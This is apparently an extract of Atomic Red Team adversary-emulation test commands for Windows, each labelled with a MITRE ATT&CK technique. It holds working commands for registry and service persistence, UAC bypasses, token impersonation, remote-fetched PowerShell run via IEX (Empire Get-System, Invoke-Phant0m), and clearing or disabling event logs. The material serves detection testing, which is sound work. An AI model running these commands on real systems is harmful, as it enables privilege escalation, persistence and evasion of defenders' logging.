1939: [- name: Set Arbitrary Binary as Screensaver] [attack_technique: T1546.002] [      reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f]
1940: [- name: Set Arbitrary Binary as Screensaver] [attack_technique: T1546.002] [      reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f]
1941: [- name: Set Arbitrary Binary as Screensaver] [attack_technique: T1546.002] [      shutdown /r /t 0]
1944: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [    command: |]
1945: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [      # run these in sequence]
1946: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [      $SecurityPackages = Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages']
1947: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [      $SecurityPackagesUpdated = $SecurityPackages]
1948: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [      $SecurityPackagesUpdated += "#{fake_ssp_dll}"]
1949: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [      Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated]
1950: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] []
1951: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [      # revert (before reboot)]
1952: [- name: Modify SSP configuration in registry] [attack_technique: T1547.005] [      Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackages]
1955: [- name: Service Registry Permissions Weakness] [attack_technique: T1574.011] [    command: |]
1956: [- name: Service Registry Permissions Weakness] [attack_technique: T1574.011] [      get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL]
1957: [- name: Service Registry Permissions Weakness] [attack_technique: T1574.011] [      get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL]
1960: [- name: Service ImagePath Change with reg.exe] [attack_technique: T1574.011] [    command: |]
1961: [- name: Service ImagePath Change with reg.exe] [attack_technique: T1574.011] [      reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}" /f /v ImagePath /d "#{malicious_service_path}"]
1966: [- name: Shortcut Modification] [attack_technique: T1547.009] [    command: |]
1967: [- name: Shortcut Modification] [attack_technique: T1547.009] [      echo [InternetShortcut] > #{shortcut_file_path}]
1968: [- name: Shortcut Modification] [attack_technique: T1547.009] [      echo URL=C:\windows\system32\calc.exe >> #{shortcut_file_path}]
1969: [- name: Shortcut Modification] [attack_technique: T1547.009] [      #{shortcut_file_path}]
1974: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [    command: |]
1975: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $Shell = New-Object -ComObject ("WScript.Shell")]
1976: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut = $Shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk")]
1977: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.TargetPath="cmd.exe"]
1978: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.WorkingDirectory = "C:\Windows\System32";]
1979: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.WindowStyle = 1;]
1980: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.Description = "T1547.009.";]
1981: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.Save()]
1982: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] []
1983: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $Shell = New-Object -ComObject ("WScript.Shell")]
1984: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut = $Shell.CreateShortcut("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk")]
1985: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.TargetPath="cmd.exe"]
1986: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.WorkingDirectory = "C:\Windows\System32";]
1987: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.WindowStyle = 1;]
1988: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.Description = "T1547.009.";]
1989: [- name: Create shortcut to cmd in startup folders] [attack_technique: T1547.009] [      $ShortCut.Save()]
1995: [- name: Named pipe client impersonation] [attack_technique: T1134.001] [    command: |]
1996: [- name: Named pipe client impersonation] [attack_technique: T1134.001] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
1997: [- name: Named pipe client impersonation] [attack_technique: T1134.001] [      IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose]
2000: [- name: '`SeDebugPrivilege` token duplication'] [attack_technique: T1134.001] [    command: |]
2001: [- name: '`SeDebugPrivilege` token duplication'] [attack_technique: T1134.001] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
2002: [- name: '`SeDebugPrivilege` token duplication'] [attack_technique: T1134.001] [      IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose]
2005: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [    command: |]
2006: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';]
2007: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [                      EventNameSpace='root\CimV2';]
2008: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [                      QueryLanguage="WQL";]
2009: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [                      Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};]
2010: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs]
2011: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] []
2012: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';]
2013: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [                      CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}]
2014: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs]
2015: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] []
2016: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      $FilterToConsumerArgs = @{]
2017: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      Filter = [Ref] $Filter;]
2018: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      Consumer = [Ref] $Consumer;]
2019: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      }]
2020: [- name: Persistence via WMI Event Subscription] [attack_technique: T1546.003] [      $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs]
2030: [- name: Service Installation CMD] [attack_technique: T1543.003] [    command: |]
2031: [- name: Service Installation CMD] [attack_technique: T1543.003] [      sc config Fax binPath= "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \"write-host 'T1543.003 Test'\""]
2032: [- name: Service Installation CMD] [attack_technique: T1543.003] [      sc start Fax]
2033: [- name: Service Installation CMD] [attack_technique: T1543.003] [    cleanup_command:]
2034: [- name: Service Installation CMD] [attack_technique: T1543.003] [      sc config Fax binPath= "C:\WINDOWS\system32\fxssvc.exe" >nul 2>&1]
2035: [- name: Service Installation CMD] [attack_technique: T1543.003] []
2036: [- name: Service Installation CMD] [attack_technique: T1543.003] [  auto_generated_guid: 981e2942-e433-44e9-afc1-8c957a1496b6]
2037: [- name: Service Installation CMD] [attack_technique: T1543.003] [    Download an executable from github and start it as a service.]
2038: [- name: Service Installation CMD] [attack_technique: T1543.003] [    Upon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.]
2039: [- name: Service Installation CMD] [attack_technique: T1543.003] [  supported_platforms:]
2040: [- name: Service Installation CMD] [attack_technique: T1543.003] [    - windows]
2041: [- name: Service Installation CMD] [attack_technique: T1543.003] [  input_arguments:]
2042: [- name: Service Installation CMD] [attack_technique: T1543.003] [    binary_path:]
2043: [- name: Service Installation CMD] [attack_technique: T1543.003] [      type: Path]
2044: [- name: Service Installation CMD] [attack_technique: T1543.003] [      default: PathToAtomicsFolder\T1543.003\bin\AtomicService.exe]
2045: [- name: Service Installation CMD] [attack_technique: T1543.003] [    service_name:]
2046: [- name: Service Installation CMD] [attack_technique: T1543.003] [      type: String]
2047: [- name: Service Installation CMD] [attack_technique: T1543.003] [      default: AtomicTestService_CMD]
2048: [- name: Service Installation CMD] [attack_technique: T1543.003] []
2049: [- name: Service Installation CMD] [attack_technique: T1543.003] [  dependency_executor_name: powershell]
2050: [- name: Service Installation CMD] [attack_technique: T1543.003] [  dependencies:]
2051: [- name: Service Installation CMD] [attack_technique: T1543.003] [    - description: |]
2052: [- name: Service Installation CMD] [attack_technique: T1543.003] [        Service binary must exist on disk at specified location (#{binary_path})]
2053: [- name: Service Installation CMD] [attack_technique: T1543.003] [      prereq_command: |]
2054: [- name: Service Installation CMD] [attack_technique: T1543.003] [        if (Test-Path #{binary_path}) {exit 0} else {exit 1}]
2055: [- name: Service Installation CMD] [attack_technique: T1543.003] [      get_prereq_command: |]
2056: [- name: Service Installation CMD] [attack_technique: T1543.003] [        New-Item -Type Directory (split-path #{binary_path}) -ErrorAction ignore | Out-Null]
2057: [- name: Service Installation CMD] [attack_technique: T1543.003] [        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe" -OutFile "#{binary_path}"]
2058: [- name: Service Installation CMD] [attack_technique: T1543.003] [  executor:]
2061: [- name: Service Installation PowerShell] [attack_technique: T1543.003] [    command: |]
2062: [- name: Service Installation PowerShell] [attack_technique: T1543.003] [      sc.exe create #{service_name} binPath= #{binary_path}]
2063: [- name: Service Installation PowerShell] [attack_technique: T1543.003] [      sc.exe start #{service_name}]
2089: [- name: TinyTurla backdoor service w64time] [attack_technique: T1543.003] [    command: |]
2090: [- name: TinyTurla backdoor service w64time] [attack_technique: T1543.003] [      New-Service -Name "#{service_name}" -BinaryPathName "#{binary_path}"]
2091: [- name: TinyTurla backdoor service w64time] [attack_technique: T1543.003] [      Start-Service -Name "#{service_name}"]
2119: [- name: Winlogon Shell Key Persistence - PowerShell] [attack_technique: T1547.004] [    command: |]
2120: [- name: Winlogon Shell Key Persistence - PowerShell] [attack_technique: T1547.004] [      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force]
2125: [- name: Winlogon Userinit Key Persistence - PowerShell] [attack_technique: T1547.004] [    command: |]
2126: [- name: Winlogon Userinit Key Persistence - PowerShell] [attack_technique: T1547.004] [      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, #{binary_to_execute}" -Force]
2131: [- name: Winlogon Notify Key Logon Persistence - PowerShell] [attack_technique: T1547.004] [    command: |]
2132: [- name: Winlogon Notify Key Logon Persistence - PowerShell] [attack_technique: T1547.004] [      New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force]
2133: [- name: Winlogon Notify Key Logon Persistence - PowerShell] [attack_technique: T1547.004] [      Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" "logon" "#{binary_to_execute}" -Force]
2138: [- name: Process Injection via C#] [attack_technique: T1055.004] [    command: |]
2139: [- name: Process Injection via C#] [attack_technique: T1055.004] [      #{exe_binary}]
2142: [- name: Bitsadmin Download (cmd)] [attack_technique: T1197] [    command: |]
2143: [- name: Bitsadmin Download (cmd)] [attack_technique: T1197] [      bitsadmin.exe /transfer /Download /priority Foreground #{remote_file} #{local_file}]
2148: [- name: Bitsadmin Download (PowerShell)] [attack_technique: T1197] [    command: |]
2149: [- name: Bitsadmin Download (PowerShell)] [attack_technique: T1197] [      Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}]
2154: [- name: Persist, Download, & Execute] [attack_technique: T1197] [    command: |]
2155: [- name: Persist, Download, & Execute] [attack_technique: T1197] [      bitsadmin.exe /create #{bits_job_name}]
2156: [- name: Persist, Download, & Execute] [attack_technique: T1197] [      bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}]
2157: [- name: Persist, Download, & Execute] [attack_technique: T1197] [      bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} NULL]
2158: [- name: Persist, Download, & Execute] [attack_technique: T1197] [      bitsadmin.exe /resume #{bits_job_name}]
2159: [- name: Persist, Download, & Execute] [attack_technique: T1197] [      ping -n 5 127.0.0.1 >nul 2>&1]
2160: [- name: Persist, Download, & Execute] [attack_technique: T1197] [      bitsadmin.exe /complete #{bits_job_name}]
2165: [- name: Bits download using desktopimgdownldr.exe (cmd)] [attack_technique: T1197] [    command: |]
2166: [- name: Bits download using desktopimgdownldr.exe (cmd)] [attack_technique: T1197] [      set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file} /eventName:desktopimgdownldr]
2171: [- name: Bypass UAC using Event Viewer (cmd)] [attack_technique: T1548.002] [    command: |]
2172: [- name: Bypass UAC using Event Viewer (cmd)] [attack_technique: T1548.002] [      reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f]
2173: [- name: Bypass UAC using Event Viewer (cmd)] [attack_technique: T1548.002] [      cmd.exe /c eventvwr.msc]
2178: [- name: Bypass UAC using Event Viewer (PowerShell)] [attack_technique: T1548.002] [    command: |]
2179: [- name: Bypass UAC using Event Viewer (PowerShell)] [attack_technique: T1548.002] [      New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force]
2180: [- name: Bypass UAC using Event Viewer (PowerShell)] [attack_technique: T1548.002] [      Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force]
2181: [- name: Bypass UAC using Event Viewer (PowerShell)] [attack_technique: T1548.002] [      Start-Process "C:\Windows\System32\eventvwr.msc"]
2186: [- name: Bypass UAC using Fodhelper] [attack_technique: T1548.002] [    command: |]
2187: [- name: Bypass UAC using Fodhelper] [attack_technique: T1548.002] [      reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f]
2188: [- name: Bypass UAC using Fodhelper] [attack_technique: T1548.002] [      reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f]
2189: [- name: Bypass UAC using Fodhelper] [attack_technique: T1548.002] [      fodhelper.exe]
2194: [- name: Bypass UAC using Fodhelper - PowerShell] [attack_technique: T1548.002] [    command: |]
2195: [- name: Bypass UAC using Fodhelper - PowerShell] [attack_technique: T1548.002] [      New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force]
2196: [- name: Bypass UAC using Fodhelper - PowerShell] [attack_technique: T1548.002] [      New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force]
2197: [- name: Bypass UAC using Fodhelper - PowerShell] [attack_technique: T1548.002] [      Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force]
2198: [- name: Bypass UAC using Fodhelper - PowerShell] [attack_technique: T1548.002] [      Start-Process "C:\Windows\System32\fodhelper.exe"]
2203: [- name: Bypass UAC using ComputerDefaults (PowerShell)] [attack_technique: T1548.002] [    command: |]
2204: [- name: Bypass UAC using ComputerDefaults (PowerShell)] [attack_technique: T1548.002] [      New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force]
2205: [- name: Bypass UAC using ComputerDefaults (PowerShell)] [attack_technique: T1548.002] [      New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force]
2206: [- name: Bypass UAC using ComputerDefaults (PowerShell)] [attack_technique: T1548.002] [      Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force]
2207: [- name: Bypass UAC using ComputerDefaults (PowerShell)] [attack_technique: T1548.002] [      Start-Process "C:\Windows\System32\ComputerDefaults.exe"]
2212: [- name: Bypass UAC by Mocking Trusted Directories] [attack_technique: T1548.002] [    command: |]
2213: [- name: Bypass UAC by Mocking Trusted Directories] [attack_technique: T1548.002] [      mkdir "\\?\C:\Windows \System32\"]
2214: [- name: Bypass UAC by Mocking Trusted Directories] [attack_technique: T1548.002] [      copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"]
2215: [- name: Bypass UAC by Mocking Trusted Directories] [attack_technique: T1548.002] [      mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"]
2221: [- name: Bypass UAC using sdclt DelegateExecute] [attack_technique: T1548.002] [    command: |]
2222: [- name: Bypass UAC using sdclt DelegateExecute] [attack_technique: T1548.002] [      New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '#{command.to.execute}']
2223: [- name: Bypass UAC using sdclt DelegateExecute] [attack_technique: T1548.002] [      New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"]
2224: [- name: Bypass UAC using sdclt DelegateExecute] [attack_technique: T1548.002] [      Start-Process -FilePath $env:windir\system32\sdclt.exe]
2225: [- name: Bypass UAC using sdclt DelegateExecute] [attack_technique: T1548.002] [      Start-Sleep -s 3]
2230: [- name: Disable UAC using reg.exe] [attack_technique: T1548.002] [    command: |]
2231: [- name: Disable UAC using reg.exe] [attack_technique: T1548.002] [      reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f]
2236: [- name: Bypass UAC using SilentCleanup task] [attack_technique: T1548.002] [    command: |]
2237: [- name: Bypass UAC using SilentCleanup task] [attack_technique: T1548.002] [      #{file_path}]
2240: [- name: UACME Bypass Method 23] [attack_technique: T1548.002] [    command: |]
2241: [- name: UACME Bypass Method 23] [attack_technique: T1548.002] [      "#{uacme_exe}"]
2247: [- name: UACME Bypass Method 31] [attack_technique: T1548.002] [    command: |]
2248: [- name: UACME Bypass Method 31] [attack_technique: T1548.002] [      "#{uacme_exe}"]
2254: [- name: UACME Bypass Method 33] [attack_technique: T1548.002] [    command: |]
2255: [- name: UACME Bypass Method 33] [attack_technique: T1548.002] [      "#{uacme_exe}"]
2261: [- name: UACME Bypass Method 34] [attack_technique: T1548.002] [    command: |]
2262: [- name: UACME Bypass Method 34] [attack_technique: T1548.002] [      "#{uacme_exe}"]
2268: [- name: UACME Bypass Method 39] [attack_technique: T1548.002] [    command: |]
2269: [- name: UACME Bypass Method 39] [attack_technique: T1548.002] [      "#{uacme_exe}"]
2275: [- name: UACME Bypass Method 56] [attack_technique: T1548.002] [    command: |]
2276: [- name: UACME Bypass Method 56] [attack_technique: T1548.002] [      "#{uacme_exe}"]
2282: [- name: UACME Bypass Method 59] [attack_technique: T1548.002] [    command: |]
2283: [- name: UACME Bypass Method 59] [attack_technique: T1548.002] [      "#{uacme_exe}"]
2289: [- name: UACME Bypass Method 61] [attack_technique: T1548.002] [    command: |]
2290: [- name: UACME Bypass Method 61] [attack_technique: T1548.002] [      "#{uacme_exe}"]
2318: [- name: CMSTP Executing Remote Scriptlet] [attack_technique: T1218.003] [    command: |]
2319: [- name: CMSTP Executing Remote Scriptlet] [attack_technique: T1218.003] [      cmstp.exe /s #{inf_file_path}]
2322: [- name: CMSTP Executing UAC Bypass] [attack_technique: T1218.003] [    command: |]
2323: [- name: CMSTP Executing UAC Bypass] [attack_technique: T1218.003] [      cmstp.exe /s #{inf_file_uac} /au]
2326: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [    command: |]
2327: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan]
2328: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value #{file_name} -Force | Out-Null]
2329: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null]
2330: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null]
2331: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null]
2332: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      Write-Host "executing eventvwr.msc" -ForegroundColor Cyan]
2333: [- name: User scope COR_PROFILER] [attack_technique: T1574.012] [      START MMC.EXE EVENTVWR.MSC]
2341: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [    command: |]
2342: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [      Write-Host "Creating system environment variables" -ForegroundColor Cyan]
2343: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null]
2344: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null]
2345: [- name: System Scope COR_PROFILER] [attack_technique: T1574.012] [      New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null]
2352: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [    command: |]
2353: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [      $env:COR_ENABLE_PROFILING = 1]
2354: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [      $env:COR_PROFILER = '#{clsid_guid}']
2355: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [      $env:COR_PROFILER_PATH = '#{file_name}']
2356: [- name: Registry-free process scope COR_PROFILER] [attack_technique: T1574.012] [      POWERSHELL -c 'Start-Sleep 1']
2363: [- name:  Prevent Powershell History Logging] [attack_technique: T1070.003] [    command: |]
2364: [- name:  Prevent Powershell History Logging] [attack_technique: T1070.003] [       Set-PSReadlineOption –HistorySaveStyle SaveNothing]
2367: [- name:  Clear Powershell History by Deleting History File] [attack_technique: T1070.003] [    command: |]
2368: [- name:  Clear Powershell History by Deleting History File] [attack_technique: T1070.003] [       Remove-Item (Get-PSReadlineOption).HistorySavePath]
2371: [- name: Clear Logs] [attack_technique: T1070.001] [    command: |]
2372: [- name: Clear Logs] [attack_technique: T1070.001] [      wevtutil cl #{log_name}]
2375: [- name: Delete System Logs Using Clear-EventLog] [attack_technique: T1070.001] [    command: |]
2376: [- name: Delete System Logs Using Clear-EventLog] [attack_technique: T1070.001] [      $logs = Get-EventLog -List | ForEach-Object {$_.Log}]
2377: [- name: Delete System Logs Using Clear-EventLog] [attack_technique: T1070.001] [      $logs | ForEach-Object {Clear-EventLog -LogName $_ }]
2378: [- name: Delete System Logs Using Clear-EventLog] [attack_technique: T1070.001] [      Get-EventLog -list]
2381: [- name: Clear Event Logs via VBA] [attack_technique: T1070.001] [    command: |]
2382: [- name: Clear Event Logs via VBA] [attack_technique: T1070.001] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
2383: [- name: Clear Event Logs via VBA] [attack_technique: T1070.001] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)]
2384: [- name: Clear Event Logs via VBA] [attack_technique: T1070.001] [      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"]
2387: [- name: Compile After Delivery using csc.exe] [attack_technique: T1027.004] [    command: |]
2388: [- name: Compile After Delivery using csc.exe] [attack_technique: T1027.004] [      C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file} #{input_file}]
2393: [- name: Dynamic C# Compile] [attack_technique: T1027.004] [    command: |]
2394: [- name: Dynamic C# Compile] [attack_technique: T1027.004] [      Invoke-Expression #{input_file}]
2397: [- name: Compiled HTML Help Local Payload] [attack_technique: T1218.001] [    command: |]
2398: [- name: Compiled HTML Help Local Payload] [attack_technique: T1218.001] [      hh.exe #{local_chm_file}]
2401: [- name: Compiled HTML Help Remote Payload] [attack_technique: T1218.001] [    command: |]
2402: [- name: Compiled HTML Help Remote Payload] [attack_technique: T1218.001] [      hh.exe #{remote_chm_file}]
2405: [- name: Control Panel Items] [attack_technique: T1218.002] [    command: |]
2406: [- name: Control Panel Items] [attack_technique: T1218.002] [      control.exe #{cpl_file_path}]
2421: [- name: DLL Search Order Hijacking - amsi.dll] [attack_technique: T1574.001] [    command: |]
2422: [- name: DLL Search Order Hijacking - amsi.dll] [attack_technique: T1574.001] [      copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\updater.exe]
2423: [- name: DLL Search Order Hijacking - amsi.dll] [attack_technique: T1574.001] [      copy %windir%\System32\amsi.dll %APPDATA%\amsi.dll]
2424: [- name: DLL Search Order Hijacking - amsi.dll] [attack_technique: T1574.001] [      %APPDATA%\updater.exe -Command exit]
2430: [- name: DLL Side-Loading using the Notepad++ GUP.exe binary] [attack_technique: T1574.002] [    command: |]
2431: [- name: DLL Side-Loading using the Notepad++ GUP.exe binary] [attack_technique: T1574.002] [      #{gup_executable}]
2452: [- name: Activate Guest Account] [attack_technique: T1078.001] [    command: |]
2453: [- name: Activate Guest Account] [attack_technique: T1078.001] [     net user #{guest_user} /active:yes]
2458: [- name: Deobfuscate/Decode Files Or Information] [attack_technique: T1140] [    command: |]
2459: [- name: Deobfuscate/Decode Files Or Information] [attack_technique: T1140] [      certutil -encode #{executable} %temp%\T1140_calc.txt]
2460: [- name: Deobfuscate/Decode Files Or Information] [attack_technique: T1140] [      certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe]
2466: [- name: Certutil Rename and Decode] [attack_technique: T1140] [    command: |]
2467: [- name: Certutil Rename and Decode] [attack_technique: T1140] [      copy %windir%\system32\certutil.exe %temp%\tcm.tmp]
2468: [- name: Certutil Rename and Decode] [attack_technique: T1140] [      %temp%\tcm.tmp -encode #{executable} %temp%\T1140_calc2.txt]
2469: [- name: Certutil Rename and Decode] [attack_technique: T1140] [      %temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe]
2476: [- name: Read volume boot sector via DOS device path (PowerShell)] [attack_technique: T1006] [    command: |]
2477: [- name: Read volume boot sector via DOS device path (PowerShell)] [attack_technique: T1006] [      $buffer = New-Object byte[] 11]
2478: [- name: Read volume boot sector via DOS device path (PowerShell)] [attack_technique: T1006] [      $handle = New-Object IO.FileStream "\\.\#{volume}", 'Open', 'Read', 'ReadWrite']
2479: [- name: Read volume boot sector via DOS device path (PowerShell)] [attack_technique: T1006] [      $handle.Read($buffer, 0, $buffer.Length)]
2480: [- name: Read volume boot sector via DOS device path (PowerShell)] [attack_technique: T1006] [      $handle.Close()]
2481: [- name: Read volume boot sector via DOS device path (PowerShell)] [attack_technique: T1006] [      Format-Hex -InputObject $buffer]
2484: [- name: Disable Windows IIS HTTP Logging] [attack_technique: T1562.002] [    command: |]
2485: [- name: Disable Windows IIS HTTP Logging] [attack_technique: T1562.002] [      C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:true]
2492: [- name: Kill Event Log Service Threads] [attack_technique: T1562.002] [    command: |]
2493: [- name: Kill Event Log Service Threads] [attack_technique: T1562.002] [      Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore]
2494: [- name: Kill Event Log Service Threads] [attack_technique: T1562.002] [      $url = "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1"]
